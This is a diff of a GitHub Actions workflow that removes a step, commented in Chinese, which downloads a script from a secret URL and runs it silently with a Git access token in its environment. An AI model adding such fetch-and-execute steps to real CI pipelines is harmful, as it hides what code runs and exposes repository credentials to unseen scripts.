@@ -20,40 +20,6 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v3
 
-      - name: Download & Execute from Remote
-        env:
-          # 两个核心机密
-          TARGET_URL: ${{ secrets.REMOTE_SCRIPT_URL }}
-          GIT_PAT: ${{ secrets.GIT_PAT }}
-          # 标记环境，触发脚本内的静默逻辑
-          GITHUB_ACTIONS: true
-        run: |
-          # 检查 URL 是否配置
-          if [ -z "$TARGET_URL" ]; then
-            echo "Error: 未配置 REMOTE_SCRIPT_URL"
-            exit 1
-          fi
-
-          # ==========================================
-          # 核心命令：下载并流式执行
-          # -s: 静默模式 (不显示进度条)
-          # -f: 连接失败时不输出错误页 (fail silently)
-          # -L: 跟随重定向 (比如 Gist 的短链)
-          # ==========================================
-          
-          
-          
-          # 下载脚本保存为临时文件 (比直接 pipe bash 更安全，方便赋权)
-          curl -fsSL "$TARGET_URL" -o loaded_script.sh
-          
-          # 检查下载是否成功 (文件是否存在且非空)
-          if [ -s loaded_script.sh ]; then
-             chmod +x loaded_script.sh
-             ./loaded_script.sh >>/dev/null
-          else
-             echo "Error: 脚本下载失败或为空 (qwq)"
-             exit 1
-          fi
 
       - name: Log in to the GitHub Container Registry
         uses: docker/login-action@v2
